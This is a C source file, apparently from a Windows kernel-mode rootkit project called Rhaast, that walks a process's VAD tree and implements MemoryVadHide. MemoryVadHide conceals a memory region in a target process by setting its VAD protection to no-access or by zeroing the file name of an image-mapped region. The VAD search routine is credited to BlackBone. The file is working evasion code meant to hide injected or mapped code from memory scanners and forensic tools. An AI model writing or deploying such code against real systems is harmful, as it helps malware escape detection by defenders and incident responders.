#include <Rhaast.h>

TABLE_SEARCH_RESULT MemoryVadpFindNodeOrParent(
    _In_       PMM_AVL_TABLE      Table,
    _In_       ULONG_PTR          VpnStart,
    _In_ _Out_ PMMVAD_SHORT*      NodeOrParent
);

/**
 * @brief
 *      search for virtual address VAD entry
 *      in specified process
 *
 * @param Process
 *      Process to search virtual address VAD entry 
 *
 * @param Address
 *      Address to search for
 *
 * @param MmVadEntry
 *      Vad entry of specified address
 *
 * @return
 *      status of function search 
 */
NTSTATUS MemoryVadSearch(
    _In_  PEPROCESS   Process,
    _In_  ULONG_PTR   Address,
    _Out_ PMMVAD*     MmVadEntry
) {
    NTSTATUS            NtStatus = STATUS_UNSUCCESSFUL;
    ULONG_PTR           VpnStart = 0;
    PRTL_AVL_TREE       VadRoot  = NULL;
    PRTL_BALANCED_LINKS VadNode  = NULL;

    /* check params */
    if ( ( ! Process ) || ( ! MmVadEntry ) ) {
        NtStatus = STATUS_INVALID_PARAMETER;
        goto END;
    }

    VpnStart = Address >> PAGE_SHIFT;
    
    /* get pointer of EPROCESS.VadRoot via offset */
    VadRoot = C_PTR( U_PTR( Process ) + Instance.Ofs.ProcessVadRoot );
    VadNode = C_PTR( VadRoot->Root );

    /* search for VAD node entry */
    if ( MemoryVadpFindNodeOrParent( VadRoot, VpnStart, &VadNode ) == TableFoundNode ) {
        *MmVadEntry = ( PMMVAD ) VadNode;
        NtStatus    = STATUS_SUCCESS;
    } else {
        PUTS( "MemoryVadpFindNodeOrParent Table didn't found node" )
    }

END:
    return NtStatus;
}

/**
 * @brief
 *      Hides Virtual address memory region
 *      from specified process by setting
 *      NO_ACCESS to Virtual Address or
 *      clear the filename buffer from mapped memories.
 *
 *      TODO: maybe instead try to unlink it from the Vad tree.
 *
 * @param Pid
 *      Process id to hide specified address
 *
 * @param Address
 *      Virtual memory address to hide
 *
 * @return
 *      execution status of function
 */
NTSTATUS MemoryVadHide(
    _In_ ULONG      Pid,
    _In_ ULONG_PTR  Address
) {
    NTSTATUS     NtStatus   = STATUS_UNSUCCESSFUL;
    PEPROCESS    Process    = NULL;
    PMMVAD       VadEntry   = NULL;
    PFILE_OBJECT FileObject = NULL;
    
    /* query EPROCESS of target process by Pid */
    if ( ! NT_SUCCESS( NtStatus = PsLookupProcessByProcessId( C_PTR( Pid ), &Process ) ) ) {
        PRINTF( "PsLookupProcessByProcessId Failed: %p\n", NtStatus )
        goto CLEANUP;
    }

    /* search for VAD node entry of specified address */
    if ( ! NT_SUCCESS( NtStatus = MemoryVadSearch( Process, Address, &VadEntry ) ) ) {
        PRINTF( "Failed to search for Vad: %p\n", NtStatus )
    }

    if ( VadEntry ) {

        if ( VadEntry->Core.u.VadFlags.VadType == VadTypeDevicePhysicalMemory ) {

            VadEntry->Core.u.VadFlags.Protection = PAGE_NOACCESS;

            /* tell that we were successful */
            NtStatus = STATUS_SUCCESS;

        } else if ( VadEntry->Core.u.VadFlags.VadType == VadTypeImageMap ) {

            /* retrieve file object pointer of mapped memory */
            FileObject = C_PTR( VadEntry->Subsection->ControlArea->FilePointer.Value & ~0xF );

            PRINTF( 
                "FileObject FileName:   \n"
                " - Buffer : %ls        \n"
                " - Length : %ld        \n",
                FileObject->FileName.Buffer, FileObject->FileName.Length
            );

            /* empty the buffer */
            RtlSecureZeroMemory( FileObject->FileName.Buffer, FileObject->FileName.Length );

            /* tell that we were successful */
            NtStatus = STATUS_SUCCESS;

        } else {
            PRINTF( "Invalid Vad Type: %d\n", VadEntry->Core.u.VadFlags.VadType )

            /* uh invalid Vad type ?
             * tell we the caller that we failed */
            NtStatus = STATUS_UNSUCCESSFUL;
        }

    } else {
        PUTS( "VadEntry is empty" )

        /* We failed to find the Vad entry by the specified address */
        NtStatus = STATUS_UNSUCCESSFUL;
    }

CLEANUP:
    if ( Process ) {
        ObDereferenceObject( Process );
        Process = NULL;
    }

    return NtStatus; 
}

/**
 * @brief
 *      It will find and return (via the NodeOrParent parameter) the node
 *      with the given key, or if that node is not in the tree it
 *      will return (via the NodeOrParent parameter) a pointer to
 *      the parent.
 *
 * @credit
 *      This function implementation + description it taken
 *      from the BlackBoneDrv project. 
 *      https://github.com/DarthTon/Blackbone/blob/master/src/BlackBoneDrv/VadHelpers.c#L787
 *
 * @param Table
 *      The generic table to search for the key.
 *
 * @param VpnStart
 *      The starting virtual page number.
 *
 * @param NodeOrParent
 *      Will be set to point to the node containing the
 *      the key or what should be the parent of the node
 *      if it were in the tree
 *       
 * @return
 *      TableEmptyTree:
 *          The tree was empty.
 *
 *      TableFoundNode:
 *          A node with the key is in the tree.
 *          NodeOrParent points to that node.
 *
 *      TableInsertAsLeft:
 *          Node with key was not found.
 *          NodeOrParent points to what would
 *          be parent. The node would be the
 *          left child.
 *
 *        TableInsertAsRight:
 *          Node with key was not found.
 *          NodeOrParent points to what would
 *          be parent. The node would be
 *          the right child.
 */
TABLE_SEARCH_RESULT MemoryVadpFindNodeOrParent(
    _In_       PMM_AVL_TABLE  Table,
    _In_       ULONG_PTR      VpnStart,
    _In_ _Out_ PMMVAD_SHORT*  NodeOrParent
) {
    PMMADDRESS_NODE Child         = NULL;
    PMMADDRESS_NODE NodeToExamine = NULL;
    PMMVAD_SHORT    VpnCompare    = NULL;
    ULONG_PTR       startVpn      = 0;
    ULONG_PTR       endVpn        = 0;

    if ( Table->NumberGenericTableElements == 0 ) {
        return TableEmptyTree;
    }

    NodeToExamine = Table->BalancedRoot;
    
    for ( ;; ) 
    {
        VpnCompare = ( PMMVAD_SHORT ) NodeToExamine;
        startVpn   = VpnCompare->StartingVpn;
        endVpn     = VpnCompare->EndingVpn;

        startVpn |= ( ULONG_PTR ) VpnCompare->StartingVpnHigh << 32;
        endVpn   |= ( ULONG_PTR ) VpnCompare->EndingVpnHigh   << 32;

        //
        // Compare the buffer with the key in the tree element.
        //

        if ( VpnStart < startVpn ) {

            Child = NodeToExamine->Left;

            if ( Child != NULL ) {
                NodeToExamine = Child;
            }
            else {

                *NodeOrParent = NodeToExamine;
                return TableInsertAsLeft;
            }

        }
        else if ( VpnStart <= endVpn ) {

            *NodeOrParent = NodeToExamine;
            return TableFoundNode;

        }
        else {

            Child = NodeToExamine->Right;

            if ( Child != NULL ) {
                NodeToExamine = Child;
            }
            else {

                //
                // Node is not in the tree.  Set the output
                // parameter to point to what would be its
                // parent and return which child it would be.
                //

                *NodeOrParent = NodeToExamine;
                return TableInsertAsRight;
            }
        }

    }
}